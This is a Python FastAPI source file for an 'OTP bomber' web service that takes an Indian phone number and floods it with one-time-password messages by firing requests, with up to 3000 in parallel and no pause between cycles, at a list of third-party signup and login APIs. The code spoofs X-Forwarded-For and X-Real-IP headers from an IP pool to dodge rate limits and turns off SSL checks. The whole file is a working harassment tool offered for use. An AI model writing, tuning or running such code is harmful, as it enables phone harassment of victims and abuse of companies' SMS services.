#!/usr/bin/env python3
"""
🔥 FAST OTP BOMBER v8.0 — Tuned for max speed
"""

import asyncio, time, random
from datetime import datetime
from uuid import uuid4
from collections import defaultdict

import aiohttp
from fastapi import FastAPI, BackgroundTasks, Query
from fastapi.responses import JSONResponse, HTMLResponse
from fastapi.middleware.cors import CORSMiddleware
import uvicorn

from apis import ULTIMATE_APIS

try:
    import uvloop
    uvloop.install()
    print("✅ uvloop enabled")
except ImportError:
    print("⚠️  uvloop not installed")

app = FastAPI(title="FAST OTP BOMBER v8.0")
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

# ═══════════════════════════════════════════════════════════
# ⚙️ FAST SETTINGS
# ═══════════════════════════════════════════════════════════
MAX_CONCURRENT  = 3000       # zyada parallel
BATCH_CHUNK     = 200        # chhote chunks = fast response
REQUEST_TIMEOUT = 4          # 4 sec timeout = fast fail
CONNECT_TIMEOUT = 2          # 2 sec connect

OTP_KEYWORDS = ("success", "sent", "otp", "verified", "delivered", "true", "ok", "message")

_running_jobs = {}
_stop_numbers = set()
_global_stats = defaultdict(lambda: {"total":0,"http_ok":0,"otp_ok":0,"failed":0,"start":0})

_IP_POOL = ["103.159.84.134","49.36.180.11","157.32.75.10","182.70.117.55",
            "106.51.85.20","43.241.145.10","202.83.16.5","115.113.20.10",
            "49.44.80.5","150.129.20.10"]

print(f"✅ Loaded {len(ULTIMATE_APIS)} APIs")


async def fire_one(session, api, phone, stats):
    try:
        headers = dict(api["headers"])
        ip = random.choice(_IP_POOL)
        headers["X-Forwarded-For"] = ip
        headers["X-Real-IP"] = ip

        url = api["url"](phone) if callable(api["url"]) else api["url"]
        data = api["data"](phone) if api.get("data") else None

        if api["method"].upper() == "POST":
            async with session.post(url, headers=headers, data=data, ssl=False) as r:
                status = r.status
                try: text = await r.text()
                except: text = ""
        else:
            async with session.get(url, headers=headers, ssl=False) as r:
                status = r.status
                try: text = await r.text()
                except: text = ""

        stats["total"] += 1
        if status < 400:
            stats["http_ok"] += 1
            low = text[:500].lower()
            if any(k in low for k in OTP_KEYWORDS):
                stats["otp_ok"] += 1
                print(f"  ✅ [{api['name']}] OTP SENT ({status})")
            else:
                print(f"  🟡 [{api['name']}] HTTP {status}")
        else:
            stats["failed"] += 1
            print(f"  ❌ [{api['name']}] HTTP {status}")
    except asyncio.TimeoutError:
        stats["total"] += 1; stats["failed"] += 1
        print(f"  ⏱️  [{api['name']}] TIMEOUT")
    except Exception as e:
        stats["total"] += 1; stats["failed"] += 1
        print(f"  ⚠️  [{api['name']}] {type(e).__name__}")


async def bomb_worker(job_id, phone, count):
    _stop_numbers.discard(phone)

    # ⚡ CONNECTOR TUNED FOR SPEED
    connector = aiohttp.TCPConnector(
        limit=MAX_CONCURRENT,
        limit_per_host=200,          # ek host pe zyada parallel
        ttl_dns_cache=600,           # DNS cache 10 min
        force_close=False,           # keep-alive
        enable_cleanup_closed=True,
        ssl=False,
    )
    timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT, connect=CONNECT_TIMEOUT)
    headers_base = {"Connection": "keep-alive", "Accept-Encoding": "gzip, deflate"}

    stats = _global_stats[phone]
    stats["total"] = stats["http_ok"] = stats["otp_ok"] = stats["failed"] = 0
    stats["start"] = time.time()

    print(f"\n{'='*70}\n[{job_id}] 🔥 STARTED | +91{phone} | cycles={count}\n[{job_id}] {len(ULTIMATE_APIS)} APIs\n{'='*70}")

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout, headers=headers_base) as session:
            for cycle in range(count):
                if phone in _stop_numbers:
                    break

                # Fast parallel fire
                tasks = [fire_one(session, api, phone, stats) for api in ULTIMATE_APIS]
                for i in range(0, len(tasks), BATCH_CHUNK):
                    await asyncio.gather(*tasks[i:i+BATCH_CHUNK], return_exceptions=True)

                elapsed = time.time() - stats["start"]
                rps = stats["total"] / elapsed if elapsed else 0
                print(f"\n[{job_id}] ✅ Cycle {cycle+1}/{count} | Total={stats['total']} | OK={stats['http_ok']} | OTP={stats['otp_ok']} | Failed={stats['failed']} | {rps:.1f}/s\n")
                # NO sleep — instant next cycle
    except Exception as e:
        print(f"[{job_id}] ❌ {e}")
    finally:
        _running_jobs.pop(job_id, None)
        print(f"[{job_id}] 🏁 DONE | Total={stats['total']} | OTP={stats['otp_ok']}")


@app.get("/", response_class=HTMLResponse)
async def root():
    return f"""<html><body style="font-family:monospace;background:#111;color:#0f0;padding:20px">
    <h1>🔥 FAST OTP BOMBER v8.0</h1>
    <p>APIs: <b>{len(ULTIMATE_APIS)}</b> | Workers: <b>{MAX_CONCURRENT}</b></p>
    <ul>
    <li><a href="/send?number=9876543210&count=5" style="color:#0ff">/send?number=9876543210&count=5</a></li>
    <li><a href="/stop?number=9876543210" style="color:#0ff">/stop?number=9876543210</a></li>
    <li><a href="/stats?number=9876543210" style="color:#0ff">/stats?number=9876543210</a></li>
    </ul></body></html>"""

@app.get("/health")
async def health():
    return {"status": "ok", "total_apis": len(ULTIMATE_APIS), "max_workers": MAX_CONCURRENT}

@app.get("/apis")
async def list_apis():
    return {"total": len(ULTIMATE_APIS), "apis": [a["name"] for a in ULTIMATE_APIS]}

@app.get("/send")
async def send_endpoint(bg: BackgroundTasks, number: str = Query(...), count: int = Query(1)):
    number = number.strip().replace("+","").replace(" ","").replace("-","")
    if not number.isdigit() or len(number) != 10:
        return JSONResponse({"success": False, "error": "Invalid number"}, 400)
    if count <= 0 or count > 10000:
        return JSONResponse({"success": False, "error": "count 1-10000"}, 400)

    job_id = str(uuid4())[:8]
    _running_jobs[job_id] = {"number": number, "count": count}
    bg.add_task(bomb_worker, job_id, number, count)

    return {"success": True, "job_id": job_id, "target": f"+91{number}", "count": count,
            "apis": len(ULTIMATE_APIS), "total_requests": count*len(ULTIMATE_APIS),
            "stop_url": f"/stop?number={number}", "stats_url": f"/stats?number={number}"}

@app.get("/stop")
async def stop_endpoint(number: str = Query(...)):
    number = number.strip().replace("+","").replace(" ","").replace("-","")
    _stop_numbers.add(number)
    return {"success": True, "message": f"🛑 Stop for +91{number}"}

@app.get("/stats")
async def stats_endpoint(number: str = Query(...)):
    number = number.strip().replace("+","").replace(" ","").replace("-","")
    s = _global_stats.get(number, {})
    if not s or not s.get("start"):
        return {"success": False, "error": "no stats"}
    elapsed = time.time() - s.get("start", time.time())
    return {"success": True, "number": f"+91{number}", "total": s.get("total",0),
            "http_ok": s.get("http_ok",0), "otp_ok": s.get("otp_ok",0),
            "failed": s.get("failed",0), "elapsed": round(elapsed,2),
            "rps": round(s["total"]/elapsed if elapsed else 0, 1)}


if __name__ == "__main__":
    print(f"\n🔥 FAST OTP BOMBER v8.0\n▸ APIs: {len(ULTIMATE_APIS)}\n▸ Workers: {MAX_CONCURRENT}\n▸ http://0.0.0.0:5000\n")
    uvicorn.run(app, host="0.0.0.0", port=5000, log_level="warning", access_log=False)
